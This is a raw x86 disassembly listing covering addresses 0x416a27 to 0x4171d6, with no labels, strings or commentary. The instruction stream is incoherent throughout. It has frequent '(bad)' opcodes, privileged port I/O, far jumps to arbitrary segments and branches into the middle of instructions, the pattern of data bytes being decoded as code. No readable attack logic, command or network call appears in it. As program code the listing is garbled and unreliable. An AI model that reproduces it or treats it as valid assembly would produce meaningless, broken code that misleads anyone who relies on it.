  416a27:	adc    eax,0x4c3b4115
  416a2c:	and    al,0xc9
  416a2e:	rol    BYTE PTR [edx+esi*8-0x2d],0x71
  416a33:	outs   dx,BYTE PTR ds:[esi]
  416a34:	and    BYTE PTR [ecx-0x7097c322],ch
  416a3a:	pop    edi
  416a3b:	(bad)  
  416a3c:	int3   
  416a3d:	cmp    esi,eax
  416a3f:	mov    esi,0xae4f4308
  416a44:	loop   0x4169e2
  416a46:	imul   edi,DWORD PTR [esi+0x2],0xffffffa7
  416a4a:	call   0xc057ea49
  416a4f:	jo     0x416acf
  416a51:	push   0xc15092f0
  416a56:	and    al,0x40
  416a58:	stos   DWORD PTR es:[edi],eax
  416a59:	add    cl,dl
  416a5b:	xchg   ebp,eax
  416a5c:	jae    0x416ac0
  416a5e:	cmp    al,0x42
  416a60:	cmp    al,0xc8
  416a62:	sbb    eax,0x8668b72b
  416a67:	loope  0x416ac3
  416a69:	arpl   WORD PTR [eax+0x4e7c98a7],dx
  416a6f:	clc    
  416a70:	aas    
  416a71:	lahf   
  416a72:	xchg   ecx,eax
  416a73:	sbb    edx,DWORD PTR [esi-0x51c5a77b]
  416a79:	jmp    FWORD PTR [esi+0x2e9b7be6]
  416a7f:	retf   0xcaa3
  416a82:	cli    
  416a83:	out    dx,al
  416a84:	loopne 0x416a15
  416a86:	pop    ss
  416a87:	add    BYTE PTR [ecx-0x19ca671c],dh
  416a8d:	jbe    0x416a2e
  416a8f:	inc    ebx
  416a90:	sbb    ecx,edi
  416a92:	sbb    BYTE PTR [ecx],dh
  416a94:	retf   0x5dd2
  416a97:	pop    ss
  416a98:	pop    ebp
  416a99:	pop    ss
  416a9a:	jmp    0x5324:0xd9651862
  416aa1:	mov    bl,0x69
  416aa3:	out    dx,al
  416aa4:	bound  esp,QWORD PTR [ebp-0x15]
  416aa7:	mov    bh,0xd1
  416aa9:	inc    ecx
  416aaa:	sub    DWORD PTR [edx+0x66],0x774cffe6
  416ab1:	lods   eax,DWORD PTR ds:[esi]
  416ab2:	mov    BYTE PTR [ecx-0x37f9b62d],bl
  416ab8:	mov    esi,0x9a2506ff
  416abd:	mov    edi,0xa0d3da9
  416ac2:	pusha  
  416ac3:	add    DWORD PTR [ecx-0x50],ebx
  416ac6:	jmp    0x47a5:0xae4c7d35
  416acd:	enter  0xd6c2,0xa5
  416ad1:	push   es
  416ad2:	out    0x86,eax
  416ad4:	pop    esp
  416ad5:	mov    WORD PTR [ecx-0x30],?
  416ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ad9:	jge    0x416ad9
  416adb:	pop    es
  416adc:	(bad)  
  416add:	mov    ah,0x3a
  416adf:	jmp    0xa45a:0x15759c7
  416ae6:	in     al,0xe4
  416ae8:	fnstcw WORD PTR ds:0xe7b22227
  416aee:	scas   al,BYTE PTR es:[edi]
  416aef:	dec    ecx
  416af0:	xor    DWORD PTR [edx+edx*1-0x4d],0xffffffb9
  416af5:	sbb    eax,0x9eb4d162
  416afa:	jb     0x416b3e
  416afc:	pop    ecx
  416afd:	cmp    ah,BYTE PTR [edx-0x5ad3aa9d]
  416b03:	fs mov edi,0x1fb2a959
  416b09:	clc    
  416b0a:	enter  0xf2dd,0xc
  416b0e:	out    0x40,eax
  416b10:	in     al,0x4a
  416b12:	xchg   DWORD PTR [ecx-0x79987a9d],ebx
  416b18:	xlat   BYTE PTR ds:[ebx]
  416b19:	pop    es
  416b1a:	pop    esp
  416b1b:	push   esi
  416b1c:	pop    ebp
  416b1d:	mov    edi,0x40402508
  416b22:	sub    eax,DWORD PTR [edi-0x76]
  416b25:	in     al,0x67
  416b27:	(bad)  
  416b28:	sbb    eax,0xd6922ee3
  416b2d:	cmp    esi,DWORD PTR [edx+0x520b0fe5]
  416b33:	ja     0x416b11
  416b35:	mov    ch,0x3
  416b37:	iret   
  416b38:	popf   
  416b39:	mov    ds,WORD PTR [eax-0x4f57117c]
  416b3f:	iret   
  416b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b41:	pop    ds
  416b42:	in     eax,0x56
  416b44:	or     DWORD PTR [esi+0x79626a5c],edi
  416b4a:	xor    esp,ecx
  416b4c:	lds    ecx,FWORD PTR [ebx-0x47769b13]
  416b52:	add    BYTE PTR [edx+0x2e],dh
  416b55:	add    ebp,DWORD PTR [ebx-0x27]
  416b58:	dec    esp
  416b59:	hlt    
  416b5a:	dec    edx
  416b5b:	scas   eax,DWORD PTR es:[edi]
  416b5c:	test   DWORD PTR ds:[edx+0x75b63b38],edi
  416b63:	in     eax,0x12
  416b65:	jmp    0xf4676755
  416b6a:	and    DWORD PTR [eax],edx
  416b6c:	push   esp
  416b6d:	jne    0x416afd
  416b6f:	xor    BYTE PTR [ecx+0x73],0xbc
  416b73:	pop    ecx
  416b74:	push   cs
  416b75:	sbb    cl,BYTE PTR ds:0xe14ba5ef
  416b7b:	sub    dl,dl
  416b7d:	mov    dl,BYTE PTR [ecx]
  416b7f:	stc    
  416b80:	jmp    0x3631:0x33f5602f
  416b87:	test   BYTE PTR [ebp+0x2f],cl
  416b8a:	sbb    DWORD PTR [ebp+edi*1-0x28],edx
  416b8e:	(bad)  
  416b90:	mov    al,dl
  416b92:	dec    eax
  416b93:	jns    0x416bea
  416b95:	fist   DWORD PTR ss:[edi+0x4ebdf4b2]
  416b9c:	cmp    al,0x2c
  416b9e:	arpl   WORD PTR [esi],bx
  416ba0:	(bad)  
  416ba1:	or     eax,0x144287ee
  416ba6:	dec    esi
  416ba7:	add    BYTE PTR [eax-0x58fbc8e9],dh
  416bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bae:	lock sub dh,BYTE PTR [esi]
  416bb1:	xchg   ebp,eax
  416bb2:	mov    al,0x6a
  416bb4:	adc    eax,0x4d2d6814
  416bb9:	mov    BYTE PTR gs:[eax+0x78d615e2],bh
  416bc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bc1:	sub    BYTE PTR [esi-0x6abf5890],bh
  416bc7:	push   edx
  416bc8:	fdivr  DWORD PTR [edi-0x1fd04935]
  416bce:	xchg   edi,eax
  416bcf:	cmp    eax,0xbe3e078d
  416bd4:	imul   ecx,DWORD PTR [ecx],0x1ab11078
  416bda:	dec    ebp
  416bdb:	popa   
  416bdc:	adc    DWORD PTR [edx],edx
  416bde:	mov    esp,0xc77a03fb
  416be3:	std    
  416be4:	dec    edi
  416be5:	jecxz  0x416be4
  416be7:	out    dx,al
  416be8:	popa   
  416be9:	icebp  
  416bea:	cmp    eax,0xe7fafbfb
  416bef:	test   BYTE PTR [esi-0x3fb64bea],ch
  416bf5:	adc    al,BYTE PTR [ecx]
  416bf7:	out    0x8d,eax
  416bf9:	(bad)  
  416bfa:	sbb    al,0xee
  416bfc:	ja     0x416baf
  416bfe:	inc    ecx
  416bff:	xor    BYTE PTR [eax+ebx*2-0x75],ah
  416c03:	lods   al,BYTE PTR ds:[esi]
  416c04:	outs   dx,BYTE PTR ds:[esi]
  416c05:	lea    ebp,[edi-0x5e]
  416c08:	inc    eax
  416c09:	jb     0x416bc7
  416c0b:	in     eax,0xda
  416c0d:	jbe    0x416ba3
  416c0f:	sub    bl,BYTE PTR [ebx]
  416c11:	push   es
  416c12:	pop    ebp
  416c13:	cmp    al,0x38
  416c15:	jns    0x416c94
  416c17:	daa    
  416c18:	pop    ecx
  416c19:	push   cs
  416c1a:	pushf  
  416c1b:	jb     0x416c02
  416c1d:	add    ebp,DWORD PTR [edi-0x908f076]
  416c23:	aaa    
  416c24:	adc    eax,0xbefaf003
  416c29:	call   0x3e04c191
  416c2e:	call   0x1e09:0xf97f2e13
  416c35:	adc    dh,al
  416c37:	nop
  416c38:	sti    
  416c39:	retf   
  416c3a:	(bad)  
  416c3b:	push   ss
  416c3c:	loop   0x416bec
  416c3e:	out    0xb4,al
  416c40:	out    dx,al
  416c41:	dec    eax
  416c42:	stos   DWORD PTR es:[edi],eax
  416c43:	or     eax,0xc0d8af9c
  416c48:	loopne 0x416cb8
  416c4a:	dec    edx
  416c4b:	jg     0x416c1f
  416c4d:	rol    DWORD PTR [esi-0x11],0xac
  416c51:	push   esp
  416c52:	cli    
  416c53:	(bad)  
  416c54:	pop    ebp
  416c55:	jmp    0x65ad65f0
  416c5a:	jo     0x416c92
  416c5c:	fcmovbe st,st(0)
  416c5e:	or     al,0x6b
  416c60:	cli    
  416c61:	fisttp DWORD PTR [ebx+0x36]
  416c64:	inc    edx
  416c65:	rcl    DWORD PTR [esi+0x67245099],0xfc
  416c6c:	push   ebx
  416c6d:	add    BYTE PTR [esi],cl
  416c6f:	sar    DWORD PTR ds:0x2fdc2e89,0x6c
  416c76:	push   0x59
  416c78:	inc    edx
  416c79:	mov    al,0x1
  416c7b:	dec    ecx
  416c7c:	mov    dh,0x9
  416c7e:	or     ebp,DWORD PTR [eax]
  416c80:	add    bl,BYTE PTR [ebx+ecx*2-0x3f]
  416c84:	arpl   WORD PTR [ebx-0x80],bx
  416c87:	repz pop ebx
  416c89:	push   edi
  416c8a:	sbb    BYTE PTR [ebx],cl
  416c8c:	add    DWORD PTR [eax-0xeb67d06],edx
  416c92:	in     al,dx
  416c93:	xor    cl,bl
  416c95:	push   ss
  416c96:	bswap  esp
  416c98:	lea    ebp,[ebx-0x48676d78]
  416c9e:	lods   eax,DWORD PTR ds:[esi]
  416c9f:	fadd   DWORD PTR [ecx+0x1e]
  416ca2:	es or  al,0xad
  416ca5:	or     DWORD PTR [ecx+0x7b467ceb],edi
  416cab:	in     eax,dx
  416cac:	lahf   
  416cad:	lods   eax,DWORD PTR ds:[esi]
  416cae:	dec    esp
  416caf:	jmp    0x556f:0x308e5b37
  416cb6:	and    al,0x42
  416cb8:	in     al,dx
  416cb9:	push   ss
  416cba:	pop    ss
  416cbb:	out    0x60,al
  416cbd:	xchg   edi,ebx
  416cbf:	fimul  DWORD PTR [eax-0x381c1b2c]
  416cc5:	out    0x2,eax
  416cc7:	in     al,dx
  416cc8:	mov    esp,0xc597f646
  416ccd:	push   ebp
  416cce:	dec    edi
  416ccf:	scas   al,BYTE PTR es:[edi]
  416cd0:	mov    ch,0x98
  416cd2:	adc    al,0xf6
  416cd4:	aaa    
  416cd5:	jmp    0x416c88
  416cd7:	sub    eax,0x5e6c96ce
  416cdc:	jb     0x416d22
  416cde:	sub    bh,BYTE PTR [eax+0xd]
  416ce1:	push   eax
  416ce2:	sti    
  416ce3:	ins    DWORD PTR es:[edi],dx
  416ce4:	xchg   edi,eax
  416ce5:	out    0xbd,eax
  416ce7:	sbb    al,0x32
  416ce9:	stos   BYTE PTR es:[edi],al
  416cea:	xor    ch,BYTE PTR [ebp-0x49]
  416ced:	push   ebp
  416cee:	adc    edx,ebp
  416cf0:	mov    al,ds:0xb9112929
  416cf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cf6:	inc    edi
  416cf7:	mul    DWORD PTR [esi+0xc8423f3]
  416cfd:	scas   eax,DWORD PTR es:[edi]
  416cfe:	test   DWORD PTR [ebp+0x6db3b481],esp
  416d04:	test   BYTE PTR [eax],dh
  416d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d07:	fistp  QWORD PTR [eax+0x36]
  416d0a:	pop    esi
  416d0b:	and    DWORD PTR ds:0xc4544d,esp
  416d11:	mov    al,ds:0xdf34d7d0
  416d16:	scas   eax,DWORD PTR es:[edi]
  416d17:	clc    
  416d18:	ins    DWORD PTR es:[edi],dx
  416d19:	retf   0xac8a
  416d1c:	js     0x416c9f
  416d1e:	mov    bh,0xd8
  416d20:	sbb    ebx,edx
  416d22:	call   0x2331:0x441cf8c
  416d29:	push   esi
  416d2a:	mov    edx,0x1b18e0c8
  416d2f:	mov    WORD PTR [ebx+0x4af91648],es
  416d35:	dec    ebp
  416d36:	inc    ecx
  416d37:	leave  
  416d38:	ins    DWORD PTR es:[edi],dx
  416d39:	xor    DWORD PTR [edx-0x47],0xffffffbb
  416d3d:	push   cs
  416d3e:	jns    0x416ce2
  416d40:	shl    edi,1
  416d42:	push   0xfa23a5e0
  416d47:	adc    eax,ecx
  416d49:	cmp    al,0xa1
  416d4b:	enter  0x50fc,0x2d
  416d4f:	adc    BYTE PTR [esi-0x6f],0x8e
  416d53:	shr    BYTE PTR [ecx-0x2280a717],0x11
  416d5a:	dec    esi
  416d5b:	mov    edx,?
  416d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d5e:	xacquire xchg BYTE PTR [ebx-0x71],bh
  416d62:	jecxz  0x416dcc
  416d64:	retf   
  416d65:	jmp    0x1d675371
  416d6a:	cmp    edx,DWORD PTR [ecx-0x4152d37a]
  416d70:	jno    0x416d7c
  416d72:	pop    edi
  416d73:	out    dx,al
  416d74:	sbb    al,ah
  416d76:	(bad)  
  416d78:	sbb    BYTE PTR ds:0x544c2a7d,dl
  416d7e:	repz and edx,DWORD PTR [eax]
  416d81:	pop    edx
  416d82:	pop    edx
  416d83:	pop    ss
  416d84:	jb     0x416df3
  416d86:	sub    al,BYTE PTR [eax]
  416d88:	jmp    0xc40c:0x4939da37
  416d8f:	mov    ds:0xe86a62d,al
  416d94:	mov    BYTE PTR [edx+eiz*2],bh
  416d97:	cmp    DWORD PTR [esi-0x3ac3dfdc],esi
  416d9d:	in     eax,dx
  416d9e:	js     0x416d3b
  416da0:	and    DWORD PTR [esp+edi*8],esp
  416da3:	gs retf 0xe4f9
  416da7:	mov    edi,0x367c8a15
  416dac:	pop    ds
  416dad:	push   cs
  416dae:	cmp    eax,0x70e35ac1
  416db3:	xlat   BYTE PTR ds:[ebx]
  416db4:	repz xor bh,BYTE PTR [ecx]
  416db7:	rol    BYTE PTR [esi],1
  416db9:	add    bh,cl
  416dbb:	pop    ecx
  416dbc:	ja     0x416d88
  416dbe:	dec    eax
  416dbf:	sti    
  416dc0:	sub    ah,ah
  416dc2:	mov    DWORD PTR ds:0xdf8c24ec,edi
  416dc8:	gs jb  0x416df4
  416dcb:	sub    al,0xa2
  416dcd:	repz adc BYTE PTR [eax],dl
  416dd0:	add    al,0xdf
  416dd2:	pushf  
  416dd3:	adc    BYTE PTR [esi-0x78],0xbf
  416dd7:	(bad)  
  416dd8:	pop    edx
  416dd9:	xchg   ebp,eax
  416dda:	mov    ds:0x40c19832,eax
  416ddf:	imul   ecx,DWORD PTR [esi+ebp*8+0x6],0xffffffc8
  416de4:	repz cmp eax,DWORD PTR [ecx-0x45f88be0]
  416deb:	inc    DWORD PTR gs:[edi]
  416dee:	mov    eax,ds:0xc8acc44a
  416df3:	ror    DWORD PTR [ecx-0x40],0x48
  416df7:	in     al,dx
  416df8:	sbb    cl,BYTE PTR cs:[edi+eiz*4-0x3c]
  416dfd:	ds jge 0x416e08
  416e00:	popa   
  416e01:	imul   esi,DWORD PTR [edx+0x62c6ab2a],0xb061133d
  416e0b:	sbb    eax,0x481b60d2
  416e10:	outs   dx,DWORD PTR ds:[esi]
  416e11:	push   ss
  416e12:	nop
  416e13:	dec    ecx
  416e14:	in     eax,dx
  416e15:	ds xor dl,bh
  416e18:	push   eax
  416e19:	aas    
  416e1a:	mov    ebp,0xc2821d8b
  416e1f:	test   al,0x95
  416e21:	xlat   BYTE PTR ds:[ebx]
  416e22:	sub    eax,0xd55a650f
  416e27:	mov    ds:0x5f26cec2,al
  416e2c:	div    bl
  416e2e:	mov    DWORD PTR [edi],eax
  416e30:	mov    ah,0xfe
  416e32:	push   esi
  416e33:	js     0x416dd7
  416e35:	or     esp,ebx
  416e37:	xchg   ebx,eax
  416e38:	imul   edi,DWORD PTR [edx],0x8c622024
  416e3e:	push   edi
  416e3f:	test   eax,0xe839f2bb
  416e44:	dec    ebx
  416e45:	scas   eax,DWORD PTR es:[edi]
  416e46:	cwde   
  416e47:	mov    esi,0x7cf95f94
  416e4c:	cmc    
  416e4d:	cdq    
  416e4e:	inc    esp
  416e4f:	pop    edi
  416e50:	das    
  416e51:	arpl   WORD PTR [ebx],si
  416e53:	and    esi,ebx
  416e55:	inc    ebx
  416e56:	fnclex 
  416e58:	sub    esp,DWORD PTR [edi-0x3]
  416e5b:	outs   dx,BYTE PTR ds:[esi]
  416e5c:	pop    ecx
  416e5d:	cmp    esi,DWORD PTR [eax]
  416e5f:	popa   
  416e60:	and    eax,0x19a3f378
  416e65:	dec    ecx
  416e66:	pop    esi
  416e67:	scas   eax,DWORD PTR es:[edi]
  416e68:	lods   al,BYTE PTR ds:[esi]
  416e69:	and    ebp,DWORD PTR [ecx+edi*8]
  416e6c:	sar    DWORD PTR [edx+0x37],1
  416e6f:	int3   
  416e70:	inc    ebx
  416e71:	shr    BYTE PTR [edx],cl
  416e73:	jb     0x416e5e
  416e75:	push   edx
  416e76:	out    0x97,eax
  416e78:	(bad)  
  416e79:	inc    eax
  416e7a:	in     eax,dx
  416e7b:	pop    eax
  416e7d:	rol    edx,1
  416e7f:	mov    bl,0xed
  416e81:	push   esi
  416e82:	cmp    al,0x7b
  416e84:	fs xor eax,0x943d001b
  416e8a:	popa   
  416e8b:	pop    esp
  416e8c:	add    al,0x14
  416e8e:	adc    esp,DWORD PTR [edi]
  416e90:	mov    eax,ds:0xdad921e
  416e95:	xor    al,0xf0
  416e97:	dec    edx
  416e98:	add    bl,cl
  416e9a:	jge    0x416ecd
  416e9c:	adc    edx,DWORD PTR ds:0x147fdadb
  416ea2:	sub    al,0x9f
  416ea4:	stc    
  416ea5:	sahf   
  416ea6:	ss adc al,0xdf
  416ea9:	test   al,0x72
  416eab:	push   es
  416eac:	icebp  
  416ead:	jb     0x416eb7
  416eaf:	ins    DWORD PTR es:[edi],dx
  416eb0:	ftst   
  416eb2:	mov    al,0xfb
  416eb4:	push   eax
  416eb5:	aad    0x38
  416eb7:	xchg   edx,eax
  416eb8:	add    ah,ch
  416eba:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  416ebc:	test   al,0xe
  416ebe:	push   ebx
  416ebf:	sar    ebp,cl
  416ec1:	cdq    
  416ec2:	mov    eax,ds:0x39666db5
  416ec7:	cs push ds
  416ec9:	scas   eax,DWORD PTR es:[edi]
  416eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ecb:	test   BYTE PTR [esi-0x41b3abb4],cl
  416ed1:	sbb    BYTE PTR [ecx],dh
  416ed3:	ret    
  416ed4:	and    eax,0x57089087
  416eda:	mov    ebp,DWORD PTR [esi]
  416edc:	pop    esi
  416edd:	mov    cl,0x26
  416edf:	dec    edx
  416ee0:	fsubr  DWORD PTR [ebx+0x468a4d02]
  416ee6:	sub    bl,BYTE PTR [edi]
  416ee8:	dec    esi
  416ee9:	or     al,0xb9
  416eeb:	inc    eax
  416eec:	sub    ch,BYTE PTR [ebx+0x48505bb1]
  416ef2:	push   ecx
  416ef3:	xchg   esp,eax
  416ef4:	loop   0x416f49
  416ef6:	dec    eax
  416ef7:	jbe    0x416f53
  416ef9:	cmp    al,0xf9
  416efb:	xchg   ebx,eax
  416efc:	ret    0x689d
  416eff:	push   cs
  416f00:	scas   eax,DWORD PTR es:[edi]
  416f01:	push   ebx
  416f02:	pop    ss
  416f03:	cmc    
  416f04:	and    eax,0xb511c4be
  416f09:	push   ss
  416f0a:	and    DWORD PTR [ecx],ebx
  416f0c:	cli    
  416f0d:	jns    0x416f10
  416f0f:	scas   al,BYTE PTR es:[edi]
  416f10:	sbb    DWORD PTR [edi-0x711154fe],ebx
  416f16:	mov    edx,0x30b22873
  416f1b:	sar    BYTE PTR [ebp+0x7a9b047b],1
  416f21:	js     0x416ef6
  416f23:	mov    ds:0x1395e249,al
  416f28:	lods   al,BYTE PTR ds:[esi]
  416f29:	mov    ah,0x4
  416f2b:	aam    0xf9
  416f2d:	lods   al,BYTE PTR ds:[esi]
  416f2e:	ins    DWORD PTR es:[edi],dx
  416f2f:	mov    esp,0x128d4af0
  416f34:	mov    esp,0x8f57afbc
  416f39:	sub    DWORD PTR [ecx],esi
  416f3b:	mov    eax,0x8aa341b
  416f40:	and    eax,0x9419fd10
  416f45:	cmp    al,0x47
  416f47:	out    0x1c,eax
  416f49:	xlat   BYTE PTR ds:[ebx]
  416f4a:	js     0x416f66
  416f4c:	lds    esi,FWORD PTR [eax+0x63]
  416f4f:	jl     0x416fa0
  416f51:	les    edx,FWORD PTR [edi+0x2]
  416f54:	aas    
  416f55:	fs inc esi
  416f57:	arpl   ax,bp
  416f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f5a:	in     al,dx
  416f5b:	ins    DWORD PTR es:[edi],dx
  416f5c:	icebp  
  416f5d:	mov    edi,0x24d79ae8
  416f62:	adc    eax,0x8eed28fa
  416f67:	jle    0x416fe6
  416f69:	pop    edx
  416f6a:	and    esi,ebx
  416f6c:	cmp    al,0xe5
  416f6e:	and    BYTE PTR [eax-0xa0ff588],cl
  416f74:	push   ecx
  416f75:	out    dx,al
  416f76:	fdivr  QWORD PTR [eax]
  416f79:	mov    DWORD PTR [esi],eax
  416f7b:	ret    
  416f7c:	pop    ds
  416f7d:	pop    edi
  416f7e:	test   eax,0xd5df811d
  416f83:	retf   
  416f84:	cdq    
  416f85:	das    
  416f86:	adc    dh,BYTE PTR [ebp-0xcf35095]
  416f8c:	xor    bl,ch
  416f8e:	cli    
  416f8f:	(bad)  
  416f90:	addr16 (bad) 
  416f92:	push   ecx
  416f93:	mov    cl,0x84
  416f95:	into   
  416f96:	jmp    0xb521055b
  416f9b:	dec    eax
  416f9c:	jge    0x41700e
  416f9e:	fiadd  DWORD PTR [esi]
  416fa0:	cmp    esp,eax
  416fa2:	or     DWORD PTR [eax-0x69],eax
  416fa5:	dec    ecx
  416fa6:	inc    eax
  416fa7:	pop    ebp
  416fa8:	sti    
  416fa9:	sub    dh,BYTE PTR [esp+esi*2+0x51f46d7b]
  416fb0:	cmovns esp,DWORD PTR [eax]
  416fb3:	inc    esp
  416fb4:	scas   eax,DWORD PTR es:[edi]
  416fb5:	sub    esi,DWORD PTR [eax]
  416fb7:	das    
  416fb8:	pop    edx
  416fb9:	pop    es
  416fba:	mov    esi,0xd7546458
  416fbf:	ins    DWORD PTR es:[edi],dx
  416fc0:	stc    
  416fc1:	icebp  
  416fc2:	shr    ecx,1
  416fc4:	pop    ss
  416fc5:	push   ebp
  416fc6:	sbb    BYTE PTR [esi+0x4f4be2a8],ah
  416fcc:	jbe    0x416f75
  416fce:	mov    edi,0xd12b34f9
  416fd3:	dec    esi
  416fd4:	fcomp  DWORD PTR [ebx-0x4a]
  416fd7:	in     eax,dx
  416fd8:	(bad)  
  416fd9:	(bad)  
  416fda:	and    DWORD PTR [ebx+0x17543173],esp
  416fe0:	bswap  esi
  416fe2:	jl     0x416fae
  416fe4:	push   ds
  416fe5:	xchg   edx,eax
  416fe6:	adc    BYTE PTR [esi+0x25],0xe
  416fea:	or     bh,BYTE PTR [ebp-0x7f]
  416fed:	out    dx,eax
  416fee:	or     DWORD PTR [eax+0x29],esp
  416ff1:	(bad)
  416ff5:	push   esp
  416ff6:	data16 ja 0x416fa2
  416ff9:	shl    BYTE PTR [esi-0x3d],1
  416ffc:	int3   
  416ffd:	in     al,dx
  416ffe:	push   0x57f6df43
  417003:	loope  0x416fe0
  417005:	test   eax,0x642c700c
  41700a:	cmp    eax,0xacfd4c80
  41700f:	mov    ebp,0xe69a107b
  417014:	adc    bh,BYTE PTR [ebx-0x419db4ab]
  41701a:	fs cmp eax,ebp
  41701d:	and    DWORD PTR ds:0x2528bb21,0x703a9981
  417027:	arpl   WORD PTR [esi],si
  417029:	fisub  WORD PTR [ecx-0x37]
  41702c:	aas    
  41702d:	dec    ebp
  41702e:	int    0x8e
  417030:	mov    bl,0x8
  417032:	test   al,0xa5
  417034:	fldcw  WORD PTR [ebx-0x53]
  417037:	ret    
  417038:	in     al,dx
  417039:	ror    BYTE PTR [eax-0x46],0x14
  41703d:	pop    edx
  41703e:	lahf   
  41703f:	push   ss
  417040:	mov    ecx,0x2fcb8c6d
  417045:	xor    eax,0xdc5c6a3c
  41704a:	lods   eax,DWORD PTR ds:[esi]
  41704b:	mov    dl,0x8c
  41704d:	or     al,0x42
  41704f:	sbb    dl,ch
  417051:	fild   DWORD PTR [edx+edx*2+0x43]
  417055:	and    DWORD PTR [ebp+ebx*8-0x6401bde4],ecx
  41705c:	inc    ebp
  41705d:	xlat   BYTE PTR ds:[ebx]
  41705e:	je     0x416ff7
  417060:	mov    dh,0xd1
  417062:	(bad)  
  417063:	and    al,0x67
  417065:	add    BYTE PTR [ebx-0x1f],bl
  417068:	and    cl,BYTE PTR gs:[ebp-0x208ffdcf]
  41706f:	jl     0x417089
  417071:	cmp    eax,0xe1209eb9
  417076:	or     DWORD PTR [esi+0x6],ecx
  417079:	pop    esp
  41707a:	sbb    dl,BYTE PTR [ecx]
  41707c:	fcomp  DWORD PTR [ecx+0x52]
  41707f:	push   0xe0d0089d
  417084:	dec    ebp
  417085:	mov    al,0xe8
  417087:	and    dh,BYTE PTR [eax-0x72fa0537]
  41708d:	or     BYTE PTR ds:0xe57471a9,0x8b
  417094:	xchg   edx,ebx
  417096:	ja     0x417054
  417098:	ret    
  417099:	xchg   ebx,eax
  41709a:	pop    esi
  41709b:	pusha  
  41709c:	jbe    0x417076
  41709e:	dec    ebx
  41709f:	sub    ch,0xc0
  4170a2:	(bad)  
  4170a3:	jmp    0x4170a7
  4170a5:	lods   eax,DWORD PTR ds:[esi]
  4170a6:	inc    ebx
  4170a7:	fcmove st,st(7)
  4170a9:	or     eax,0x97d5834b
  4170ae:	mov    ch,0x34
  4170b0:	mov    DWORD PTR [edx+0x73],edi
  4170b3:	pusha  
  4170b4:	repz xchg ebx,eax
  4170b6:	push   ds
  4170b7:	fidivr DWORD PTR [esi]
  4170b9:	cwde   
  4170ba:	out    dx,eax
  4170bb:	xchg   ebp,eax
  4170bc:	push   edx
  4170bd:	rcr    BYTE PTR [esi*8-0x8392983],0x8
  4170c5:	mov    al,ds:0xe52acb49
  4170ca:	cmp    bl,bh
  4170cc:	push   es
  4170cd:	rcl    DWORD PTR [ebx+0x39c5dc44],1
  4170d3:	in     al,dx
  4170d4:	xor    eax,0xcd7dced6
  4170d9:	xor    ebp,DWORD PTR [eax-0x72]
  4170dc:	lods   al,BYTE PTR ds:[esi]
  4170dd:	pop    ss
  4170de:	(bad)  
  4170df:	mov    edx,0x7fe50678
  4170e4:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4170e6:	mov    ah,0x2
  4170e8:	jge    0x4170ea
  4170ea:	cmp    BYTE PTR ds:0x7bb158b1,0x54
  4170f1:	and    dh,bh
  4170f3:	inc    ecx
  4170f4:	popf   
  4170f5:	std    
  4170f6:	aaa    
  4170f7:	call   0x794d7b8c
  4170fc:	mov    DWORD PTR [esi-0xad1733],edi
  417102:	das    
  417103:	add    al,0x53
  417105:	xchg   ebp,eax
  417106:	in     eax,0x4f
  417108:	fnstenv [edi-0x3b]
  41710b:	push   es
  41710c:	ss dec ebx
  41710e:	out    dx,al
  41710f:	cwde   
  417110:	adc    dl,bl
  417112:	sub    DWORD PTR [edi],0xffffff9b
  417115:	lods   al,BYTE PTR ds:[esi]
  417116:	jmp    0x7a3a:0x6cc17619
  41711d:	jg     0x41716d
  41711f:	mov    BYTE PTR [ebx],bh
  417121:	arpl   WORD PTR [ebx-0x29],dx
  417124:	jmp    0xf498e179
  417129:	retf   0x94f7
  41712c:	inc    esp
  41712d:	pop    ss
  41712e:	int3   
  41712f:	push   ebx
  417130:	pushf  
  417131:	pushf  
  417132:	jno    0x41719c
  417134:	rol    DWORD PTR [ebx],cl
  417136:	(bad)  
  417137:	icebp  
  417138:	mov    DWORD PTR [esi+0x497dbb78],ebx
  41713e:	fistp  WORD PTR [edi-0x1ffc8690]
  417144:	jge    0x41712e
  417146:	cmp    ebx,DWORD PTR [ecx+0x2a]
  417149:	xor    ebp,0x33781547
  41714f:	lds    ebx,FWORD PTR [eax-0x24]
  417152:	repnz test al,0x8e
  417155:	cwde   
  417156:	jp     0x417135
  417158:	not    DWORD PTR [ebp+0x58fab921]
  41715e:	dec    esp
  41715f:	sar    BYTE PTR [ebp+0x14e1e990],0x1d
  417166:	push   edi
  417167:	aam    0x6f
  417169:	xor    al,BYTE PTR [ebx-0xa]
  41716c:	fsubrp st(4),st
  41716e:	sub    DWORD PTR [ebx+esi*8+0x2bb4d5ec],ebp
  417175:	aaa    
  417176:	retf   0x51ba
  417179:	dec    edi
  41717a:	repnz dec ecx
  41717c:	mov    eax,0xdff0bd3e
  417181:	aam    0x0
  417183:	fisubr WORD PTR [ebx-0x2]
  417186:	pop    es
  417187:	bnd jmp 0xf61e6792
  41718d:	and    DWORD PTR [ebx+0xf],edi
  417190:	pop    es
  417191:	iret   
  417192:	xchg   BYTE PTR [ebp-0x6c55b94a],dh
  417198:	jo     0x417135
  41719a:	mov    ah,0x6b
  41719c:	sar    DWORD PTR ds:0xcef8bfe1,0x3a
  4171a3:	and    edx,DWORD PTR [esi-0xd]
  4171a6:	popf   
  4171a7:	ret    0x9b0c
  4171aa:	pop    edx
  4171ab:	fistp  WORD PTR ds:0xa7408b1d
  4171b1:	(bad)  
  4171b2:	fadd   DWORD PTR [ebx+0xd]
  4171b5:	(bad)  
  4171b6:	(bad)  
  4171b7:	into   
  4171b8:	jl     0xed0984c3
  4171be:	imul   esp,eax,0xffffff98
  4171c1:	test   eax,0xa2a9047a
  4171c6:	push   ss
  4171c7:	pop    ecx
  4171c8:	adc    BYTE PTR [edi+eax*8+0x21aea9c4],dh
  4171cf:	cdq    
  4171d0:	nop
  4171d1:	loope  0x4171e9
  4171d3:	sub    edx,DWORD PTR [ebx+0xc]
  4171d6:	jmp    0x417227
